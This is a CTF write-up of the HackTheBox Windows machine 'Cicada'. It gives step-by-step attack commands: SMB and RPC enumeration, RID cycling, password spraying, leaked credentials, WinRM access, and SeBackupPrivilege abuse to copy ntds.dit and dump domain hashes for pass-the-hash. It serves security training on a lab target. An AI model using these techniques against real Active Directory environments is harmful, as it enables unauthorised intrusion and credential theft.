---
title: Cicada
date: 2026-04-18
categories: [CTFs, HackTheBox]
tags: [windows, ad, netexec, enumeration, rid-cycling]
media_subpath: /assets/img/HackTheBox/Cicada
image: 
    path: Cicada.webp
    lqip: data:image/webp;base64,UklGRlIAAABXRUJQVlA4IEYAAAAwAwCdASoUAAsAPzmEuVOvKKWisAgB4CcJQAAIXVeEC3yAAP7o8RHRm4kv7VgCUjB0rXifRiKOqaaXABmMvcF1G/yZkUAA
    alt: Info Card
---

## Summary

[Cicada](https://www.hackthebox.com/machines/cicada){: target="_blank" } is an easy Windows machine that serves as a great introduction to foundational Active Directory enumeration and exploitation. The path begins with an initial foothold gained through anonymous enumeration of the domain, leading to the discovery of plaintext credentials stored in accessible files. After identifying valid users and performing a successful password spray, we gain access to sensitive shares. The final stage involves leveraging the SeBackupPrivilege to extract critical system files, allowing us to dump hashes and achieve full system compromise.

## Port Scanning

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.129.95.254 -oN allports
```

![Nmap: Allports](image_1.webp)
_Open Ports_

## Nmap Default Scripts

```bash
nmap -p53,135,139,389,445,464,593,636,3268,3269,5985,53795 -sCV 10.129.95.254 -oN services
```

![Nmap: Default Scripts](image_2.webp)
_Nmap default scripts_

## SMB Enumeration

First of all, we are going to use `nxc` to get some valuable information about our target such as its name and the domain.

```bash
nxc smb 10.129.95.254
```

![Basic Domain Info](image_3.webp)
_Initial Enum_

After that we can use `smbmap` to list available shares using a guest session.

```bash
smbmap -H 10.129.95.254 -u 'test' -p ''
```

![SMB](image_4.webp)
_Guest session on SMB_

There are 2 shares but we can only access **HR** so using the following command we can retrieve the content of that share:

```bash
smbmap -H 10.129.95.254 -u 'test' -p '' -r 'HR'
```

![Listing HR Share](image_5.webp)
_Listing HR Share_

Since there is a file on that share we will use `smbclient` to download it to our machine. 

```bash
smbclient //10.129.95.254/HR -N
```

![Access via smbclient](image_6.webp)
_Using smbclient_

The file contains instructions for a new user to setup his account. It has a default password but we don't have any users to test, so our next step is to find a way to enumerate valid users.

![Default Password](image_7.webp)
_Default Password_

## Enumerating Users - RID Cycling

We need to get a list of valid users to test the password we found, our first attempt is to log into **rpc** with a null session to see if we can use some of the commands to display valid users of the domain.

```bash
rpcclient -U '' 10.129.95.254 -N
```

![RPC Null Session](image_8.webp)
_RPC Null Session_

As shown above, we use a null session to connect to the domain via **rpc** but we can not enumerate anything. However there is another technique that we can use because guest sessions is available on this domain. We are going to perform [RID Cycling](https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adds-enumerate/#rid-cycling){: target="_blank" } in order to get all the domain users.

>RID Cycling is a method that allows attackers to enumerate domain objects by bruteforcing or guessing RIDs and SIDs, based on the fact that RIDs are sequential.
{: .prompt-info }

Using a guest session we have the possibility to execute `lookupnames` and `lookupsids`. As shown below using the first one we can get the [SID](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers){: target="_blank" } for the Administrator user.

```bash
rpcclient -U 'guest%' 10.129.95.254 -c 'lookupnames Administrator'
```

![rpcclient lookupnames](image_9.webp)
_lookupnames command_

To perform an **RID Cycling** we have to use `lookupsids`, for instance we can use the Administrator's **SID** we got before and we will be displayed with the same info that we know.

![SID & RID](image_10.webp)
_SID & RID_

However we could change the [RID](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers#relative-identifier-allocation){: target="_blank" } which is the last part of numbers of the **SID**.  You can see below that we are increasing the **RID** one by one and we get different users or if there is no user with that **RID**, we get **unknown**.

```bash
rpcclient -U 'guest%' 10.129.95.254 -c 'lookupsids S-1-5-21-917908876-1423158569-3159038727-500'
```

![RID Cycling](image_11.webp)
_RID Cycling Demo_

### Using xargs to perform RID Cycling

As shown before, we could get valid users by incrementing the **RID**. We can automate this process using the following command which uses `xargs` to send the requests in threads so we could go as fast as possible.

```bash
seq 500 2000 | xargs -P 50 -I {} rpcclient -U 'guest%' 10.129.95.254 -c 'lookupsids S-1-5-21-917908876-1423158569-3159038727-{}' | grep -v unknown
```

![RID Cycling with xargs](image_12.webp)
_RID Cycling with xargs_

### Automated RID Cycling using NetExec

We can easily get valid users using `nxc` which has the flag `--rid-brute` and this will perform the RID Cycling as well.

```bash
nxc smb 10.129.95.254 -u 'guest' -p '' --rid-brute
```

![Automated RID Cycling](image_13.webp)
_RID Cycling with nxc_

### Password Spraying

Now that we have a list of valid users on the domain, we will use `nxc` to test if any of these users still use the default password we found before.

```bash
nxc smb 10.129.95.254 -u users -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success
```

![Password Spraying](image_14.webp)
_Password Spraying_

>Initial Creds
>* `michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8`
{: .prompt-tip }

## Shell as Emily

Now that we have a valid credential, we could use `rpcclient` one more time but in this case we could use more commands such us `querydispinfo`. This command will display the users and their descriptions. In this case, one user has its password on the description field:

```bash
rpcclient -U 'michael.wrightson%Cicada$M6Corpb*@Lp#nZp!8' 10.129.95.254 -c 'querydispinfo'
```

![Password Found](image_15.webp)
_Password stored on users's description_

We could validate that password using `nxc` and we will also use `--shares`, after executing the command we can notice now we have access to the **DEV** share so let's enumerate it. 

```bash
nxc smb 10.129.95.254 -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' --shares
```

![Validation](image_16.webp)
_Read Access on DEV_

>New Creds
>* `david.orelious:aRt$Lp#7t*VQ!3`
{: .prompt-tip }

Again using `smbmap` to display files inside **DEV**.

```bash
smbmap -H 10.129.95.254 -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' -r 'DEV'
```

![DEV Share](image_17.webp)
_Listing DEV Share_

There is one powershell script which will be downloaded to our machine using the following command:

```bash
smbmap -H 10.129.95.254 -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' --download 'DEV/Backup_script.ps1'
```

![Download Script](image_18.webp)
_Creds found on PS script_

That backup script contains a new credential for a user that could connect to the DC using [WinRM](https://learn.microsoft.com/en-us/windows/win32/winrm/portal){: target="_blank" }.

```bash
nxc winrm 10.129.95.254 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
```

![WinRM](image_19.webp)
_WinRM Access_

>Remote Management User Creds
>* `emily.oscars:Q!3@Lp#M6b*7t*Vt`
{: .prompt-tip }

Using `evil-winrm` we could get access to the box as **emily**.

```bash
evil-winrm -i 10.129.95.254 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
```

![Initial Access](image_20.webp)
_Initial Access via WinRM_

## Privilege Escalation - Backup Operators Group

Checking our privileges we can notice we have [SeBackupPrivilege](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants#constants){: target="_blank" } enabled. This privilege could let us elevate to administrator since we have access to all the files in the system.

```powershell
whoami /priv
```

![Privileges](image_21.webp)
_Privileges for emily.oscars_

Another way to notice the privilege we have is to check all the info of the user. We are part of the [Backup Operators](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#backup-operators){: target="_blank" } whose members, according to Microsoft, can back up and restore all files on a computer, regardless of the permissions that protect those files.

```powershell
net user emily.oscars
```

![Groups](image_22.webp)
_Backup Operators group_

To abuse this group we would backup the [ntds.dit](https://www.cayosoft.com/blog/ntds-dit/){: target="_blank" } file following the steps from this [article](https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges.html#backup-operators){: target="_blank" }. We have to create a script first and upload it to the box.

```powershell
set context persistent nowriters 
add volume c: alias flygerth 
create 
expose %flygerth% z: 
```

Once the script is on the target machine, we have to run the following command to create a copy of all the system file in a new logical drive:

```powershell
diskshadow.exe /s script.txt
```

![Shadow copy](image_23.webp)
_Creating a shadow copy_

We can check the copy was created successfully.

```powershell
dir Z:\Windows\NTDS
```

![New Drive](image_24.webp)
_New Drive_

Now we are going to use [robocopy](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy){: target="_blank" } to copy the **ntds.dit** from the **Z:** drive we just created.

```bash
robocopy /b Z:\Windows\NTDS . ntds.dit
```

![NTDS.dit](image_25.webp)
_Creating a copy of NTDS.dit_

We also need the **SYSTEM** registry to decrypt the **ntds.dit** file. We can copy this easily using the privilege we have.

```powershell
reg save HKLM\System C:\Windows\Temp\Privesc\system
```

![SYSTEM Hive](image_26.webp)
_System Hive_

We have to send those file to our machine in order to use `impacket-secretsdump`.

![Evil-Winrm download](image_27.webp)
_Evil-Winrm download_

We are going to use the following command to perform a local process and get the hashes of all the users in the domain.

```bash
impacket-secretsdump -system system -ntds ntds.dit LOCAL -just-dc-ntlm
```

![Local Process](image_28.webp)
_Local process with secretsdump_

We can validate the hash using `nxc` and then connect to the target with `evil-winrm`.

```bash
nxc smb 10.129.95.254 -u 'Administrator' -H '2b87e7c93a3e8a0ea4a581937016f341'
```

![PWNED](image_29.webp)
_Admin NT Hash_

```bash
evil-winrm -i 10.129.95.254 -u 'Administrator' -H '2b87e7c93a3e8a0ea4a581937016f341'
```

![Shell as Administrator](image_30.webp)
_Shell as Administrator_

## Flags

- [x] user.txt

```powershell
type C:\Users\emily.oscars.CICADA\Desktop\user.txt
a7e**************************c8d
```

- [x] root.txt

```powershell
type C:\Users\Administrator\Desktop\root.txt
99b**************************d60
```

<h2 style="text-align:center;">Glad you read through. Stay tuned for the next box! 🔗 🔍</h2>
{: data-toc-skip='' .mt-4 .mb-0 }
